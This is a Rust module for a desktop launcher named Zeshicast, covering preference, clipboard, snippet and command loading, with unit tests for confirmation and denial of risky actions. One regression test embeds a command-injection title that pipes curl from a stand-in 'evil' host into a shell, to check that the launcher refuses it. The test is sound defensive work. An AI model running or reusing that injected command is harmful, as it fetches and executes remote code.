use std::borrow::Cow;
use std::collections::{HashMap, HashSet};
use std::io;
use std::path::{Path, PathBuf};
use std::time::SystemTime;

use crate::action::{
    Action, ActionFormCommand, ActionKind, ActionRisk, ExecutionDecision, ExecutionPolicy,
    ExecutionRequest, ExecutionTicket, ProcessCommand, SecondaryAction, SecondaryActionKind,
    ShellCommand, execute,
};
use crate::config::{
    append_alias, home_dir, load_aliases, load_frequencies, load_lines,
    load_preferences_with_backup, normalize_alias, write_lines, write_preferences,
};
use crate::extensions::{ExtensionManifest, load_extension_manifests};
use crate::placeholders::{PlaceholderContext, expand_placeholders, expand_placeholders_shell};
use crate::search::apps::{AppEntry, load_apps};
use crate::search::clipboard::load_clipboard_history;
use crate::search::commands::{CommandEntry, load_command_entries, load_extension_command_entries};
use crate::search::files::{FileEntry, load_file_index};
use crate::search::named_values::{NamedValue, load_named_values};
use crate::search::scripts::{ScriptEntry, load_extension_script_entries, load_script_entries};
use crate::search::snapshot::SearchData;
pub use crate::services::clipboard_store::*;
use crate::services::storage;
use crate::services::text_input::{is_wtype_available, type_text_via_wtype};

mod clipboard;
mod launch;
mod preferences;
mod snippets;

/// Reached by path from outside `app` (see `search/snapshot.rs`).
pub(crate) use self::preferences::preference_enabled_value;
use self::preferences::{load_calc_history, preference_script_dirs};

#[derive(Debug, Clone)]
pub struct CalcHistoryEntry {
    pub expr: String,
    pub result: String,
}

#[derive(Debug, Clone)]
pub struct Zeshicast {
    pub(crate) apps: Vec<AppEntry>,
    pub(crate) quicklinks: Vec<NamedValue>,
    pub(crate) snippets: Vec<NamedValue>,
    pub(crate) commands: Vec<CommandEntry>,
    pub(crate) scripts: Vec<ScriptEntry>,
    pub(crate) clipboard_history: Vec<String>,
    pub(crate) clipboard_timestamps: HashMap<String, i64>,
    pub(crate) calc_history: Vec<CalcHistoryEntry>,
    pub(crate) preferences: HashMap<String, String>,
    /// `false` when `preferences.toml` could not be parsed at startup: the file
    /// is never overwritten until the user fixes it (M-10).
    pub(crate) preferences_writable: bool,
    pub(crate) aliases: HashMap<String, String>,
    pub(crate) pins: HashSet<String>,
    pub(crate) recent: Vec<String>,
    pub(crate) frequencies: HashMap<String, u32>,
    pub(crate) extensions: Vec<ExtensionManifest>,
    pub(crate) files: Vec<FileEntry>,
    pub(crate) config_dir: PathBuf,
}

#[derive(Debug, Clone)]
pub struct SnippetSummary {
    pub id: i64,
    pub name: String,
    pub prefix: String,
    pub preview: String,
    pub value: String,
    pub tags: Vec<String>,
}

fn migrate_legacy_storage_if_needed(config_dir: &Path) {
    if !storage::clipboard_has_data(config_dir) {
        let legacy = load_clipboard_history(&config_dir.join("clipboard.txt"));
        if !legacy.is_empty()
            && let Err(error) = storage::migrate_clipboard(config_dir, &legacy)
        {
            log::warn!("could not migrate the legacy clipboard history: {error}");
        }
    }
    if !storage::usage_has_data(config_dir) {
        let recent_legacy = load_lines(&config_dir.join("recent.txt"))
            .into_iter()
            .map(|l| l.to_lowercase())
            .collect::<Vec<_>>();
        let freq_legacy = load_frequencies(&config_dir.join("frequencies.txt"));
        if !recent_legacy.is_empty()
            && let Err(error) = storage::migrate_usage(config_dir, &recent_legacy, &freq_legacy)
        {
            log::warn!("could not migrate the legacy usage history: {error}");
        }
    }
    if !storage::snippet_has_data(config_dir) {
        let legacy = load_named_values(&config_dir.join("snippets.txt"));
        if !legacy.is_empty() {
            let entries: Vec<(String, String, Vec<String>)> = legacy
                .into_iter()
                .map(|item| (item.name, item.value, item.tags))
                .collect();
            if let Err(error) = storage::migrate_snippets(config_dir, &entries) {
                log::warn!("could not migrate the legacy snippets: {error}");
            }
        }
    }
}

struct LoadedClipboardAndUsage {
    history: Vec<String>,
    timestamps: HashMap<String, i64>,
    recent: Vec<String>,
    frequencies: HashMap<String, u32>,
}

fn load_clipboard_and_usage(
    config_dir: &Path,
    preferences: &HashMap<String, String>,
) -> LoadedClipboardAndUsage {
    let clipboard_retention = clipboard_retention_value(preferences);
    let clip_rows = storage::clipboard_load_with_limit(config_dir, clipboard_retention);
    let history: Vec<String> = clip_rows.iter().map(|(t, _)| t.clone()).collect();
    let timestamps: HashMap<String, i64> = clip_rows.into_iter().collect();
    if let Err(error) = prune_clipboard_image_cache(&history) {
        log::warn!("could not prune the clipboard image cache: {error}");
    }

    let recent = storage::usage_recent(config_dir, 50);
    let frequencies = storage::usage_frequencies(config_dir);

    LoadedClipboardAndUsage {
        history,
        timestamps,
        recent,
        frequencies,
    }
}

fn load_commands_and_scripts(
    config_dir: &Path,
    script_dirs: &[PathBuf],
    extensions: &[ExtensionManifest],
) -> (Vec<CommandEntry>, Vec<ScriptEntry>) {
    let mut commands = load_command_entries(&config_dir.join("commands"));
    commands.extend(load_extension_command_entries(extensions));
    let mut scripts = load_script_entries(script_dirs);
    scripts.extend(load_extension_script_entries(extensions));
    (commands, scripts)
}

#[derive(Debug, Clone)]
pub struct CommandSummary {
    pub kind: String,
    pub name: String,
    pub category: String,
    pub description: String,
    pub keyword: Option<String>,
    pub icon_name: String,
    pub tags: Vec<String>,
    pub permissions: Vec<String>,
    pub capabilities: Vec<String>,
    pub extension: Option<ExtensionSummary>,
    pub enabled: bool,
}

impl CommandSummary {
    pub fn extension_group(&self) -> String {
        self.extension
            .as_ref()
            .map(|extension| extension.name.clone())
            .unwrap_or_else(|| "Built-in".to_string())
    }

    pub fn extension_detail(&self) -> String {
        self.extension
            .as_ref()
            .map(|extension| format!("{}@{}", extension.id, extension.version))
            .unwrap_or_else(|| "legacy command directories".to_string())
    }
}

#[derive(Debug, Clone)]
pub struct ExtensionSummary {
    pub id: String,
    pub name: String,
    pub version: String,
    pub capabilities: Vec<String>,
}

impl ExtensionSummary {
    pub(crate) fn from_origin(origin: &crate::extensions::ExtensionOrigin) -> Self {
        Self {
            id: origin.id.clone(),
            name: origin.name.clone(),
            version: origin.version.clone(),
            capabilities: origin.capabilities.clone(),
        }
    }
}

impl Zeshicast {
    pub fn load() -> Self {
        Self::load_inner(true)
    }

    /// Like `load`, but skips the (potentially slow) filesystem index so the GUI
    /// can present its window without blocking on a `$HOME` walk. Pair with
    /// [`build_file_index`](Self::build_file_index) +
    /// [`set_file_index`](Self::set_file_index) to fill it in on a worker thread.
    #[cfg(feature = "gui")]
    pub(crate) fn load_deferred_files() -> Self {
        Self::load_inner(false)
    }

    /// Build the filesystem index. Safe to call off the main thread.
    #[cfg(feature = "gui")]
    pub(crate) fn build_file_index() -> Vec<FileEntry> {
        load_file_index(&home_dir())
    }

    /// Install a filesystem index built elsewhere (see `build_file_index`).
    #[cfg(feature = "gui")]
    pub(crate) fn set_file_index(&mut self, files: Vec<FileEntry>) {
        self.files = files;
    }

    fn load_inner(index_files: bool) -> Self {
        let home = home_dir();
        let config_dir = home.join(".config/zeshicast");
        let preferences_path = config_dir.join("preferences.toml");
        let (preferences, preferences_writable) = load_preferences_with_backup(&preferences_path);
        let script_dirs = preference_script_dirs(&preferences, &config_dir);
        let extensions = load_extension_manifests(&config_dir);

        migrate_legacy_storage_if_needed(&config_dir);
        let storage_data = load_clipboard_and_usage(&config_dir, &preferences);
        let (commands, scripts) = load_commands_and_scripts(&config_dir, &script_dirs, &extensions);
        let calc_history = load_calc_history(&config_dir.join("calc_history.json"));

        let snippets = if storage::snippet_has_data(&config_dir) {
            storage::snippets_load(&config_dir)
                .into_iter()
                .map(|record| NamedValue {
                    name: record.title,
                    value: record.content,
                    tags: record.tags,
                })
                .collect()
        } else {
            load_named_values(&config_dir.join("snippets.txt"))
        };

        Self {
            apps: load_apps(&home),
            quicklinks: load_named_values(&config_dir.join("quicklinks.txt")),
            snippets,
            commands,
            scripts,
            clipboard_history: storage_data.history,
            clipboard_timestamps: storage_data.timestamps,
            calc_history,
            preferences,
            preferences_writable,
            aliases: load_aliases(&config_dir.join("aliases.txt")),
            pins: load_lines(&config_dir.join("pins.txt"))
                .into_iter()
                .map(|line| line.to_lowercase())
                .collect(),
            recent: storage_data.recent,
            frequencies: storage_data.frequencies,
            extensions,
            files: if index_files {
                load_file_index(&home)
            } else {
                Vec::new()
            },
            config_dir,
        }
    }

    pub fn reload(&mut self) {
        *self = Self::load();
    }

    /// Snapshot of the inputs `search` reads (M-1).
    ///
    /// The palette moves this to a worker thread: `Zeshicast` itself is an
    /// `Rc<RefCell<..>>` shared with the widgets and therefore not `Send`.
    pub(crate) fn search_data(&self) -> SearchData {
        SearchData {
            apps: self.apps.clone(),
            quicklinks: self.quicklinks.clone(),
            snippets: self.snippets.clone(),
            commands: self.commands.clone(),
            scripts: self.scripts.clone(),
            clipboard_history: self.clipboard_history.clone(),
            preferences: self.preferences.clone(),
            aliases: self.aliases.clone(),
            pins: self.pins.clone(),
            recent: self.recent.clone(),
            frequencies: self.frequencies.clone(),
            extensions: self.extensions.clone(),
            files: self.files.clone(),
            calc_history: self.calc_history.clone(),
        }
    }

    pub fn search(&self, query: &str) -> Vec<Action> {
        self.search_data().search(query)
    }

    pub fn list_commands(&self) -> Vec<CommandSummary> {
        let mut summaries = self
            .commands
            .iter()
            .map(|e| CommandSummary {
                kind: "Command".to_string(),
                name: e.name.clone(),
                category: e.category.clone(),
                description: e.description.clone(),
                keyword: e.keyword.clone(),
                icon_name: e.icon_name.clone(),
                tags: e.tags.clone(),
                permissions: e.permissions.clone(),
                capabilities: e
                    .capabilities
                    .iter()
                    .map(|capability| capability.label().to_string())
                    .collect(),
                extension: e.origin.as_ref().map(ExtensionSummary::from_origin),
                enabled: true,
            })
            .collect::<Vec<_>>();

        summaries.extend(self.scripts.iter().map(|script| {
            CommandSummary {
                kind: "Script".to_string(),
                name: script.title.clone(),
                category: "Script".to_string(),
                description: script.description.clone(),
                keyword: None,
                icon_name: script.icon.clone(),
                tags: Vec::new(),
                permissions: script
                    .origin
                    .as_ref()
                    .map(|origin| origin.capabilities.clone())
                    .unwrap_or_default(),
                capabilities: script
                    .origin
                    .as_ref()
                    .map(|origin| origin.capabilities.clone())
                    .unwrap_or_default(),
                extension: script.origin.as_ref().map(ExtensionSummary::from_origin),
                enabled: true,
            }
        }));

        summaries.sort_by(|a, b| {
            a.extension_group()
                .cmp(&b.extension_group())
                .then(a.kind.cmp(&b.kind))
                .then(a.name.cmp(&b.name))
        });
        summaries
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::action::ActionForm;
    use std::fs;
    use std::time::{SystemTime, UNIX_EPOCH};

    fn test_cache_dir(name: &str) -> PathBuf {
        let nanos = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap()
            .as_nanos();
        std::env::temp_dir().join(format!("zeshicast-{name}-{}-{nanos}", std::process::id()))
    }

    fn image_entry(path: &Path) -> String {
        format!("{CLIPBOARD_IMAGE_PREFIX}{}", path.display())
    }

    fn test_app(config_dir: PathBuf, preferences: HashMap<String, String>) -> Zeshicast {
        Zeshicast {
            apps: Vec::new(),
            quicklinks: Vec::new(),
            snippets: Vec::new(),
            commands: Vec::new(),
            scripts: Vec::new(),
            clipboard_history: Vec::new(),
            clipboard_timestamps: HashMap::new(),
            calc_history: Vec::new(),
            preferences,
            preferences_writable: true,
            aliases: HashMap::new(),
            pins: HashSet::new(),
            recent: Vec::new(),
            frequencies: HashMap::new(),
            extensions: Vec::new(),
            files: Vec::new(),
            config_dir,
        }
    }

    /// Search must read launcher preferences by reference:
    /// `Zeshicast::search` calls
    /// `PlaceholderContext::new(..).with_preferences(&self.preferences)`, so
    /// building the per-keystroke context borrows the map instead of cloning
    /// it. The snippet expansion here only compiles and resolves while the
    /// context holds a borrowed `Cow::Borrowed(preferences)`.
    #[test]
    fn search_expands_preferences_from_borrowed_map() {
        let mut app = test_app(
            test_cache_dir("search-borrow-preferences"),
            HashMap::from([("deploy_token".to_string(), "secret-token".to_string())]),
        );
        app.snippets.push(NamedValue {
            name: "show deploy token".to_string(),
            value: "token={{pref:deploy_token}}".to_string(),
            tags: Vec::new(),
        });

        let actions = app.search("show deploy token");
        let expanded = actions
            .iter()
            .find(|action| action.category == "Snippet")
            .map(|action| match &action.kind {
                ActionKind::Copy(value) => value.clone(),
                _ => panic!("snippet should produce a copy action"),
            })
            .expect("snippet matching its own name should be found");

        assert_eq!(expanded, "token=secret-token");
    }

    #[test]
    fn clipboard_image_entry_round_trips_and_survives_pruning() {
        // Regression (P1.7 follow-up): `add_clipboard_image` must not run the
        // internal sentinel through the paste-ingest sanitizer, otherwise the
        // entry degrades to text and the cached PNG is pruned away again.
        let cache = test_cache_dir("clipboard-image-roundtrip");
        fs::create_dir_all(&cache).unwrap();
        let image = cache.join("shot.png");
        fs::write(&image, b"png").unwrap();

        let mut app = test_app(
            test_cache_dir("clipboard-image-roundtrip-config"),
            HashMap::new(),
        );
        let stored = with_clipboard_cache_dir(&cache, || {
            app.add_clipboard_image(&image.to_string_lossy()).unwrap()
        });
        assert!(stored);

        let entry = app
            .clipboard_history
            .first()
            .cloned()
            .expect("entry stored");
        assert_eq!(
            with_clipboard_cache_dir(&cache, || {
                crate::services::clipboard_store::clipboard_image_path(&entry)
            }),
            Some(image.to_string_lossy().as_ref())
        );
        assert_eq!(
            with_clipboard_cache_dir(&cache, || classify_clipboard_text(&entry)),
            ClipboardKind::Image
        );

        // The pruner must keep the file the entry still references.
        with_clipboard_cache_dir(&cache, || {
            prune_clipboard_image_cache(&app.clipboard_history).unwrap();
        });
        assert!(image.exists());

        let _ = fs::remove_dir_all(cache);
    }

    #[test]
    fn form_submission_requires_confirmation() {
        let mut app = test_app(test_cache_dir("form-confirm"), HashMap::new());
        let action = Action::new(
            "Command",
            "Deploy",
            ActionKind::Form(ActionForm {
                name: "Deploy".to_string(),
                fields: Vec::new(),
                command: ActionFormCommand::Shell("true".to_string()),
                env: HashMap::new(),
                preferences: HashMap::new(),
                current_args: HashMap::new(),
                partial_query: String::new(),
                capabilities: crate::action::CapabilitySet::new(vec![
                    crate::action::Capability::Shell,
                ]),
                risk: ActionRisk::Shell,
            }),
            0,
        )
        .with_risk(ActionRisk::Shell);

        // Interactive policy: the form must ask before running.
        assert_eq!(
            app.run_form_action(&action, HashMap::new()),
            ExecutionDecision::NeedsConfirmation(ActionRisk::Shell)
        );
        assert_eq!(crate::action::take_exec_count(), 0);

        // Confirmed policy runs it exactly once, through the gateway.
        assert_eq!(
            app.run_form_action_confirmed(&action, HashMap::new()),
            ExecutionDecision::RunNow
        );
        assert_eq!(crate::action::take_exec_count(), 1);
    }

    #[test]
    fn form_without_capabilities_is_denied_even_when_confirmed() {
        let mut app = test_app(test_cache_dir("form-denied"), HashMap::new());
        let action = Action::new(
            "Command",
            "Deploy",
            ActionKind::Form(ActionForm {
                name: "Deploy".to_string(),
                fields: Vec::new(),
                command: ActionFormCommand::Shell("true".to_string()),
                env: HashMap::new(),
                preferences: HashMap::new(),
                current_args: HashMap::new(),
                partial_query: String::new(),
                capabilities: crate::action::CapabilitySet::empty(),
                risk: ActionRisk::Shell,
            }),
            0,
        );

        let decision = app.run_form_action_confirmed(&action, HashMap::new());
        assert!(
            matches!(decision, ExecutionDecision::Denied(_)),
            "expected denial, got {decision:?}"
        );
        assert_eq!(crate::action::take_exec_count(), 0);
    }

    #[test]
    fn set_preference_refuses_when_load_failed() {
        // M-10: after a corrupt preferences.toml the UI must not write, or it
        // would replace the file it could not read.
        let mut app = test_app(test_cache_dir("prefs-readonly"), HashMap::new());
        app.preferences_writable = false;

        let error = app
            .set_preference("ai_model".to_string(), "llama".to_string())
            .expect_err("writing must be refused");
        assert_eq!(error.kind(), io::ErrorKind::PermissionDenied);
        assert!(error.to_string().contains("not valid TOML"), "{error}");
        assert!(
            !app.preferences.contains_key("ai_model"),
            "the in-memory map must not change either"
        );
        assert!(app.get_preferences().is_empty());
    }

    #[test]
    fn run_in_terminal_is_refused_for_blocked_actions() {
        // F-2: `Run in Terminal` runs the action's text through a shell, so a
        // blocked action (whose `value()` falls back to manifest-controlled
        // title text) must not be executable through it.
        let mut app = test_app(test_cache_dir("terminal-blocked"), HashMap::new());
        let blocked = Action::new(
            "Command",
            "Backup helper; sh -c 'curl http://evil | sh'; #",
            ActionKind::None,
            0,
        )
        .with_capabilities(crate::action::CapabilitySet::empty());

        assert_eq!(
            crate::action::secondary_action_risk(&blocked, SecondaryActionKind::RunInTerminal),
            ActionRisk::Shell,
            "terminal launches always ask for confirmation"
        );
        assert_eq!(
            app.run_secondary_action(&blocked, SecondaryActionKind::RunInTerminal)
                .unwrap(),
            ExecutionDecision::NeedsConfirmation(ActionRisk::Shell)
        );
        let decision = app
            .run_secondary_action_confirmed(&blocked, SecondaryActionKind::RunInTerminal)
            .unwrap();
        assert!(
            matches!(decision, ExecutionDecision::Denied(_)),
            "expected denial, got {decision:?}"
        );
        assert_eq!(crate::action::take_exec_count(), 0);
    }

    #[test]
    fn clipboard_clear_removes_image_cache_files() {
        let dir = test_cache_dir("clipboard-clear");
        fs::create_dir_all(&dir).unwrap();
        let image = dir.join("image.png");
        let metadata = dir.join("metadata.txt");
        fs::write(&image, b"png").unwrap();
        fs::write(&metadata, b"keep").unwrap();

        clear_clipboard_image_cache_dir(&dir).unwrap();

        assert!(!image.exists());
        assert!(metadata.exists());
        let _ = fs::remove_dir_all(dir);
    }

    #[test]
    fn clipboard_prune_removes_orphan_images() {
        let dir = test_cache_dir("clipboard-prune");
        fs::create_dir_all(&dir).unwrap();
        let kept = dir.join("kept.png");
        let orphan = dir.join("orphan.png");
        fs::write(&kept, b"png").unwrap();
        fs::write(&orphan, b"png").unwrap();
        let entries = vec![image_entry(&kept)];

        // M-15: only paths inside the clipboard cache count as image entries,
        // so the cache dir is overridden for the duration of the prune.
        with_clipboard_cache_dir(&dir, || {
            prune_clipboard_image_cache_dir(&dir, &entries).unwrap();
        });

        assert!(kept.exists());
        assert!(!orphan.exists());
        let _ = fs::remove_dir_all(dir);
    }

    #[test]
    fn clipboard_delete_keeps_still_referenced_image() {
        let dir = test_cache_dir("clipboard-delete");
        fs::create_dir_all(&dir).unwrap();
        let image = dir.join("shared.png");
        fs::write(&image, b"png").unwrap();
        let entries = vec![image_entry(&image), "plain text".to_string()];

        with_clipboard_cache_dir(&dir, || {
            prune_clipboard_image_cache_dir(&dir, &entries).unwrap();
        });

        assert!(image.exists());
        let _ = fs::remove_dir_all(dir);
    }

    #[test]
    fn clipboard_disabled_does_not_record_text() {
        let config_dir = test_cache_dir("clipboard-disabled-config");
        let mut app = test_app(
            config_dir.clone(),
            HashMap::from([("clipboard_history_enabled".to_string(), "false".to_string())]),
        );

        assert!(!app.add_clipboard_text("secret").unwrap());
        assert!(app.clipboard_history.is_empty());
        assert!(!config_dir.join("zeshicast.db").exists());
    }

    #[test]
    fn private_mode_does_not_record_clipboard() {
        let config_dir = test_cache_dir("clipboard-private-config");
        let mut app = test_app(
            config_dir.clone(),
            HashMap::from([("clipboard_private_mode".to_string(), "true".to_string())]),
        );

        assert!(!app.add_clipboard_text("secret").unwrap());
        assert!(app.clipboard_history.is_empty());
        assert!(!config_dir.join("zeshicast.db").exists());
    }

    fn clipboard_action(value: &str) -> Action {
        Action::new("Clipboard", value, ActionKind::Copy(value.to_string()), 1)
    }

    #[test]
    fn risky_secondary_actions_require_confirmation() {
        let mut app = test_app(test_cache_dir("secondary-risky-config"), HashMap::new());
        app.clipboard_history = vec!["secret".to_string(), "other".to_string()];
        let action = clipboard_action("secret");

        let decision = app
            .run_secondary_action(&action, SecondaryActionKind::DeleteClipboardItem)
            .unwrap();
        assert_eq!(
            decision,
            ExecutionDecision::NeedsConfirmation(ActionRisk::Destructive)
        );

        let decision = app
            .run_secondary_action(&action, SecondaryActionKind::ClearClipboardHistory)
            .unwrap();
        assert_eq!(
            decision,
            ExecutionDecision::NeedsConfirmation(ActionRisk::ClipboardClear)
        );

        assert_eq!(app.clipboard_history, vec!["secret", "other"]);
    }

    #[test]
    fn confirmed_secondary_actions_execute() {
        let config_dir = test_cache_dir("secondary-confirmed-config");
        let mut app = test_app(config_dir.clone(), HashMap::new());
        app.clipboard_history = vec!["secret".to_string(), "other".to_string()];

        let action = clipboard_action("secret");
        let decision = app
            .run_secondary_action_confirmed(&action, SecondaryActionKind::DeleteClipboardItem)
            .unwrap();
        assert_eq!(decision, ExecutionDecision::RunNow);
        assert_eq!(app.clipboard_history, vec!["other"]);

        let decision = app
            .run_secondary_action_confirmed(&action, SecondaryActionKind::ClearClipboardHistory)
            .unwrap();
        assert_eq!(decision, ExecutionDecision::RunNow);
        assert!(app.clipboard_history.is_empty());
        assert!(!storage::clipboard_has_data(&config_dir));
        let _ = fs::remove_dir_all(config_dir);
    }

    #[test]
    fn normal_secondary_actions_run_without_confirmation() {
        let config_dir = test_cache_dir("secondary-normal-config");
        let mut app = test_app(config_dir, HashMap::new());
        let action = clipboard_action("note");

        let decision = app
            .run_secondary_action(&action, SecondaryActionKind::Pin)
            .unwrap();
        assert_eq!(decision, ExecutionDecision::RunNow);
        assert!(app.is_pinned(&action));

        let decision = app
            .run_secondary_action(&action, SecondaryActionKind::Unpin)
            .unwrap();
        assert_eq!(decision, ExecutionDecision::RunNow);
        assert!(!app.is_pinned(&action));
        let _ = fs::remove_dir_all(test_cache_dir("secondary-normal-config"));
    }
}
